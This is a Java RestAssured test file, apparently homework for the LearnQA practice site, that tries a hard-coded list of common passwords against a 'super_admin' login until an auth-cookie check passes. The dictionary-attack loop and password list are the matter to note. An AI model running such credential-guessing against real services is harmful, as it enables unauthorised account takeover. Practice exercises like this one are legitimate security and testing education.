import groovyjarjarpicocli.CommandLine;
import io.restassured.path.json.JsonPath;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;
import io.restassured.RestAssured;

import java.util.Arrays;
import java.util.Collection;
import java.util.HashMap;
import java.util.Map;
import org.junit.runner.RunWith;

public class FindPassword {

    @Test
    public void findPassword() {


        HashMap<String, String> date = new HashMap<>();
        date.put("login", "super_admin");
        String[] findPassword ={"123456","12345","134567","123456789","qwerty",
                "password","12345678","111111","123123","1234567890","1234567","qwerty123","000000","1q2w3e",
                "aa12345678","abc123","password1","1234","qwertyuiop","123321","password123","letmein","iloveyou",
                 "111111","123123","abc123","qwerty123","1q2w3e4r","admin","qwertyuiop","654321","555555",
                 "lovely","7777777","welcome","888888","princess","dragon","password1","123qwe" };
        for(int i=0; i<findPassword.length;i++){
        date.put("password",findPassword[i]);

      //  while ( true)

                Response getResponse = RestAssured
                        .given()
                        .body(date)
                        .when()
                        .post(" https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                        .andReturn();
                getResponse.prettyPrint();
                //      System.out.println(getResponse);
                String authCookie = getResponse.getCookie("auth_Cookie");

                System.out.println(authCookie);
                int statusCode = getResponse.getStatusCode();
                System.out.println(statusCode);


                Map<String, String> cookies = new HashMap<>();
                cookies.put("auth_Cookie", authCookie);
                Response responseForPassword = RestAssured
                        .given()
                        .body(date)
                        .cookies(cookies)
                        .when()
                        .post("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                        .andReturn();

                Boolean password = responseForPassword
                        .print()
                        .equals("You are NOT authorized");

                System.out.println(password);

            System.out.println(date);
            if (password == false) break;
        }
    }

}

